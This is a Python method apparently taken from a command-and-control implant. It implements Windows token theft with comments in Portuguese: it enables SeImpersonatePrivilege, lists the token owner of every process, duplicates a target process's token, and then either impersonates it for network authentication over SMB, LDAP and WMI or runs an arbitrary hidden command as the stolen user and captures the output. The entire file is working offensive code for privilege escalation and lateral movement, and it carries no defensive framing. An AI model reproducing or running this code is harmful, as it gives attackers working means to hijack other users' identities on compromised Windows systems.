    def token_steal(self, task_id, pid=0, command=""):
        if platform.system() != 'Windows':
            return "token_steal: only supported on Windows"

        try:
            import ctypes
            import ctypes.wintypes as W

            # ── constantes ───────────────────────────────────────────────────
            PROCESS_QUERY_INFORMATION   = 0x0400
            TOKEN_DUPLICATE             = 0x0002
            TOKEN_QUERY                 = 0x0008
            TOKEN_ALL_ACCESS            = 0x000F01FF
            TOKEN_ASSIGN_PRIMARY        = 0x0001
            SecurityImpersonation       = 2
            TokenPrimary                = 1
            TokenImpersonation          = 2
            TokenUser                   = 1
            TH32CS_SNAPPROCESS          = 0x00000002
            STARTF_USESTDHANDLES        = 0x00000100
            CREATE_NO_WINDOW            = 0x08000000
            HANDLE_FLAG_INHERIT         = 0x00000001
            INFINITE                    = 0xFFFFFFFF
            SE_IMPERSONATE_PRIVILEGE    = 29

            kernel32 = ctypes.windll.kernel32
            advapi32 = ctypes.windll.advapi32
            ntdll    = ctypes.windll.ntdll

            INVALID_HANDLE = ctypes.c_size_t(-1).value

            # ── estruturas ───────────────────────────────────────────────────
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize",              W.DWORD),
                    ("cntUsage",            W.DWORD),
                    ("th32ProcessID",       W.DWORD),
                    ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID",        W.DWORD),
                    ("cntThreads",          W.DWORD),
                    ("th32ParentProcessID", W.DWORD),
                    ("pcPriClassBase",      ctypes.c_long),
                    ("dwFlags",             W.DWORD),
                    ("szExeFile",           ctypes.c_char * 260),
                ]

            class SID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [
                    ("Sid",        ctypes.c_void_p),
                    ("Attributes", W.DWORD),
                ]

            class TOKEN_USER_STRUCT(ctypes.Structure):
                _fields_ = [("User", SID_AND_ATTRIBUTES)]

            class SECURITY_ATTRIBUTES(ctypes.Structure):
                _fields_ = [
                    ("nLength",              W.DWORD),
                    ("lpSecurityDescriptor", ctypes.c_void_p),
                    ("bInheritHandle",       W.BOOL),
                ]

            class STARTUPINFOW(ctypes.Structure):
                _fields_ = [
                    ("cb",              W.DWORD),
                    ("lpReserved",      W.LPWSTR),
                    ("lpDesktop",       W.LPWSTR),
                    ("lpTitle",         W.LPWSTR),
                    ("dwX",             W.DWORD),
                    ("dwY",             W.DWORD),
                    ("dwXSize",         W.DWORD),
                    ("dwYSize",         W.DWORD),
                    ("dwXCountChars",   W.DWORD),
                    ("dwYCountChars",   W.DWORD),
                    ("dwFillAttribute", W.DWORD),
                    ("dwFlags",         W.DWORD),
                    ("wShowWindow",     W.WORD),
                    ("cbReserved2",     W.WORD),
                    ("lpReserved2",     ctypes.POINTER(ctypes.c_byte)),
                    ("hStdInput",       W.HANDLE),
                    ("hStdOutput",      W.HANDLE),
                    ("hStdError",       W.HANDLE),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess",    W.HANDLE),
                    ("hThread",     W.HANDLE),
                    ("dwProcessId", W.DWORD),
                    ("dwThreadId",  W.DWORD),
                ]

            # ── helper: username a partir de token ───────────────────────────
            def _token_user(tok):
                sz = W.DWORD(0)
                advapi32.GetTokenInformation(tok, TokenUser, None, 0, ctypes.byref(sz))
                buf = ctypes.create_string_buffer(sz.value)
                if not advapi32.GetTokenInformation(tok, TokenUser, buf, sz, ctypes.byref(sz)):
                    return "?"
                tu = TOKEN_USER_STRUCT.from_buffer(buf)
                sid = ctypes.c_void_p(tu.User.Sid)
                name   = ctypes.create_unicode_buffer(256)
                domain = ctypes.create_unicode_buffer(256)
                nsz    = W.DWORD(256)
                dsz    = W.DWORD(256)
                use    = W.DWORD(0)
                advapi32.LookupAccountSidW(None, sid, name, ctypes.byref(nsz),
                                           domain, ctypes.byref(dsz), ctypes.byref(use))
                return "{}\\{}".format(domain.value, name.value) if domain.value else name.value

            # ── helper: itera snapshot de processos ──────────────────────────
            def _enum_procs():
                snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
                if snap == INVALID_HANDLE or not snap:
                    return []
                out = []
                e = PROCESSENTRY32()
                e.dwSize = ctypes.sizeof(PROCESSENTRY32)
                if kernel32.Process32First(snap, ctypes.byref(e)):
                    while True:
                        out.append({
                            "pid":  int(e.th32ProcessID),
                            "name": e.szExeFile.decode(errors='ignore'),
                        })
                        if not kernel32.Process32Next(snap, ctypes.byref(e)):
                            break
                kernel32.CloseHandle(snap)
                return out

            # ── helper: habilita SeImpersonatePrivilege ───────────────────────
            ntdll.RtlAdjustPrivilege.restype  = ctypes.c_ulong
            ntdll.RtlAdjustPrivilege.argtypes = [
                ctypes.c_ulong, ctypes.c_bool, ctypes.c_bool,
                ctypes.POINTER(ctypes.c_bool),
            ]
            prev = ctypes.c_bool(False)
            ntdll.RtlAdjustPrivilege(SE_IMPERSONATE_PRIVILEGE, True, False, ctypes.byref(prev))

            # ════════════════════════════════════════════════════════════════
            # MODO LIST (pid == 0): enumera processos e seus tokens
            # ════════════════════════════════════════════════════════════════
            if int(pid) == 0:
                procs = _enum_procs()
                lines = ["{:<7} {:<32} {}".format("PID", "PROCESS", "TOKEN USER")]
                lines.append("-" * 72)
                seen = {}
                for p in procs:
                    if p["pid"] == 0:
                        continue
                    h = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, p["pid"])
                    if not h:
                        continue
                    tok = W.HANDLE(0)
                    if advapi32.OpenProcessToken(h, TOKEN_QUERY | TOKEN_DUPLICATE,
                                                 ctypes.byref(tok)):
                        user = _token_user(tok)
                        kernel32.CloseHandle(tok)
                        if user not in seen:
                            seen[user] = p["pid"]
                        lines.append("{:<7} {:<32} {}".format(
                            p["pid"], p["name"][:31], user))
                    kernel32.CloseHandle(h)
                lines.append("\n[*] {} processes enumerated — {} unique token users".format(
                    len(lines) - 2, len(seen)))
                return "\n".join(lines)

            # ════════════════════════════════════════════════════════════════
            # MODO STEAL: abre token do PID alvo
            # ════════════════════════════════════════════════════════════════
            target_pid = int(pid)
            h_proc = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, target_pid)
            if not h_proc:
                return "token_steal: OpenProcess(pid={}) failed (error {})".format(
                    target_pid, kernel32.GetLastError())

            tok_orig = W.HANDLE(0)
            if not advapi32.OpenProcessToken(h_proc,
                                             TOKEN_DUPLICATE | TOKEN_QUERY,
                                             ctypes.byref(tok_orig)):
                kernel32.CloseHandle(h_proc)
                return "token_steal: OpenProcessToken failed (error {})".format(
                    kernel32.GetLastError())
            kernel32.CloseHandle(h_proc)

            stolen_user = _token_user(tok_orig)

            # ────────────────────────────────────────────────────────────────
            # Sem command → ImpersonateLoggedOnUser no thread atual
            # Afeta autenticações de rede subsequentes (SMB, LDAP, WMI...)
            # ────────────────────────────────────────────────────────────────
            if not command:
                tok_imp = W.HANDLE(0)
                ok = advapi32.DuplicateTokenEx(
                    tok_orig, TOKEN_ALL_ACCESS, None,
                    SecurityImpersonation, TokenImpersonation,
                    ctypes.byref(tok_imp))
                kernel32.CloseHandle(tok_orig)
                if not ok:
                    return "token_steal: DuplicateTokenEx (impersonation) failed (error {})".format(
                        kernel32.GetLastError())

                if not advapi32.ImpersonateLoggedOnUser(tok_imp):
                    kernel32.CloseHandle(tok_imp)
                    return "token_steal: ImpersonateLoggedOnUser failed (error {})".format(
                        kernel32.GetLastError())
                kernel32.CloseHandle(tok_imp)

                # confirma impersonação
                t_check = W.HANDLE(0)
                advapi32.OpenThreadToken(kernel32.GetCurrentThread(),
                                         TOKEN_QUERY, False,
                                         ctypes.byref(t_check))
                thread_user = _token_user(t_check) if t_check else "unknown"
                kernel32.CloseHandle(t_check)

                return (
                    "[+] Token impersonated\n"
                    "    Stolen from PID : {}\n"
                    "    Token user      : {}\n"
                    "    Thread identity : {}\n\n"
                    "[*] Network auth (SMB/LDAP/WMI) now uses this token.\n"
                    "    Use 'eval_code ctypes.windll.advapi32.RevertToSelf()' to revert."
                ).format(target_pid, stolen_user, thread_user)

            # ────────────────────────────────────────────────────────────────
            # Com command → CreateProcessWithTokenW + captura de output via pipe
            # ────────────────────────────────────────────────────────────────
            tok_primary = W.HANDLE(0)
            ok = advapi32.DuplicateTokenEx(
                tok_orig, TOKEN_ALL_ACCESS, None,
                SecurityImpersonation, TokenPrimary,
                ctypes.byref(tok_primary))
            kernel32.CloseHandle(tok_orig)
            if not ok:
                return "token_steal: DuplicateTokenEx (primary) failed (error {})".format(
                    kernel32.GetLastError())

            # pipes para captura de stdout/stderr
            sa = SECURITY_ATTRIBUTES()
            sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
            sa.bInheritHandle = True

            h_read_out  = W.HANDLE(0)
            h_write_out = W.HANDLE(0)
            h_read_err  = W.HANDLE(0)
            h_write_err = W.HANDLE(0)

            kernel32.CreatePipe(ctypes.byref(h_read_out), ctypes.byref(h_write_out),
                                ctypes.byref(sa), 0)
            kernel32.CreatePipe(ctypes.byref(h_read_err), ctypes.byref(h_write_err),
                                ctypes.byref(sa), 0)

            # read ends não devem ser herdadas pelo filho
            kernel32.SetHandleInformation(h_read_out, HANDLE_FLAG_INHERIT, 0)
            kernel32.SetHandleInformation(h_read_err, HANDLE_FLAG_INHERIT, 0)

            si  = STARTUPINFOW()
            pi  = PROCESS_INFORMATION()
            si.cb        = ctypes.sizeof(STARTUPINFOW)
            si.dwFlags   = STARTF_USESTDHANDLES
            si.hStdInput  = kernel32.GetStdHandle(ctypes.c_ulong(-10))
            si.hStdOutput = h_write_out
            si.hStdError  = h_write_err

            advapi32.CreateProcessWithTokenW.restype  = W.BOOL
            advapi32.CreateProcessWithTokenW.argtypes = [
                W.HANDLE, W.DWORD, W.LPCWSTR, W.LPWSTR,
                W.DWORD, ctypes.c_void_p, W.LPCWSTR,
                ctypes.POINTER(STARTUPINFOW),
                ctypes.POINTER(PROCESS_INFORMATION),
            ]

            LOGON_WITH_PROFILE = 0x00000001
            cmd_buf = ctypes.create_unicode_buffer(command)
            ok = advapi32.CreateProcessWithTokenW(
                tok_primary, LOGON_WITH_PROFILE,
                None, cmd_buf,
                CREATE_NO_WINDOW, None, None,
                ctypes.byref(si), ctypes.byref(pi))

            kernel32.CloseHandle(tok_primary)
            kernel32.CloseHandle(h_write_out)
            kernel32.CloseHandle(h_write_err)

            if not ok:
                kernel32.CloseHandle(h_read_out)
                kernel32.CloseHandle(h_read_err)
                return "token_steal: CreateProcessWithTokenW failed (error {})".format(
                    kernel32.GetLastError())

            kernel32.WaitForSingleObject(pi.hProcess, INFINITE)

            # lê stdout e stderr dos pipes
            output = b""
            for h in (h_read_out, h_read_err):
                while True:
                    buf  = ctypes.create_string_buffer(4096)
                    read = W.DWORD(0)
                    ok   = kernel32.ReadFile(h, buf, 4096, ctypes.byref(read), None)
                    if not ok or read.value == 0:
                        break
                    output += buf.raw[:read.value]
                kernel32.CloseHandle(h)

            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)

            result = output.decode(errors='replace').strip()
            return "[+] Executed as {}\n\n{}".format(stolen_user, result) if result \
                else "[+] Executed as {} (no output)".format(stolen_user)

        except Exception as e:
            return "token_steal error: {}".format(e)
